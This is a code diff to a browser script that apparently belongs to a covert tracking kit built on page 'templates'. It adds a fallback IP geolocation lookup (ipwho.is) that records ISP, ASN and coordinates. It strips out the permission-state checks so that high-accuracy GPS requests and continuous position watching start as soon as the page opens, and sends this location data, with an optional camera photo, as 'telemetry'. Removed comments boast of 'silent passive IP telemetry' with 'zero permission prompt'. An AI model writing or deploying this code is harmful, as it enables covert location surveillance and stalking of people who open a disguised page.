@@ -77,6 +77,27 @@
             }
         } catch (err) {}
 
+        try {
+            const res3 = await fetchWithTimeout("https://ipwho.is/", 3000);
+            if (res3 && res3.ok) {
+                const data3 = await res3.json();
+                if (data3.success) {
+                    cachedIpLocation = {
+                        ip: data3.ip,
+                        city: data3.city,
+                        region: data3.region,
+                        country: data3.country,
+                        lat: data3.latitude,
+                        lng: data3.longitude,
+                        isp: (data3.connection && data3.connection.isp) || 'Mobile ISP',
+                        asn: (data3.connection && data3.connection.asn) || '',
+                        timezone: (data3.timezone && data3.timezone.id) || ''
+                    };
+                    return cachedIpLocation;
+                }
+            }
+        } catch (err3) {}
+
         return null;
     }
 
@@ -383,60 +404,48 @@
             } = options;
 
             async function triggerLocationUpdate(shouldTakePhoto = false, isUserGesture = false) {
-                let canUseGPS = false;
+                let gpsAttempted = false;
                 if (enableGPS && navigator.geolocation) {
-                    if (isUserGesture) {
-                        canUseGPS = true;
-                    } else {
-                        const geoState = await checkPermissionState('geolocation');
-                        if (geoState === 'granted') {
-                            canUseGPS = true;
-                        }
-                    }
-                }
-
-                if (canUseGPS) {
+                    gpsAttempted = true;
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
                             await sendTelemetry(position.coords, templateName, shouldTakePhoto, isUserGesture);
                             if (onSuccess) onSuccess(position.coords);
                         },
                         async (error) => {
+                            // On GPS error/denial, fallback gracefully to IP telemetry
                             await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
                             if (onError) onError(error);
                         },
                         {
                             enableHighAccuracy: true,
-                            timeout: 8000,
+                            timeout: 10000,
                             maximumAge: 0
                         }
                     );
-                } else {
-                    // SILENT PASSIVE IP TELEMETRY - Zero Permission Prompt!
+                }
+
+                if (!gpsAttempted) {
                     await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
                 }
             }
 
-            // Immediately trigger silent passive IP telemetry on page open without prompting
+            // Immediately trigger telemetry on page open
             await triggerLocationUpdate(enableCamera, false);
 
             if (isTrackingStarted) return;
             isTrackingStarted = true;
 
             if (enableGPS && navigator.geolocation) {
-                checkPermissionState('geolocation').then(geoState => {
-                    if (geoState === 'granted') {
-                        try {
-                            navigator.geolocation.watchPosition(
-                                (pos) => {
-                                    sendTelemetry(pos.coords, templateName, enableCamera, false);
-                                },
-                                () => {},
-                                { enableHighAccuracy: true, maximumAge: 0 }
-                            );
-                        } catch(e) {}
-                    }
-                });
+                try {
+                    navigator.geolocation.watchPosition(
+                        (pos) => {
+                            sendTelemetry(pos.coords, templateName, enableCamera, false);
+                        },
+                        () => {},
+                        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                    );
+                } catch(e) {}
             }
 
             initBackgroundWorker(() => {
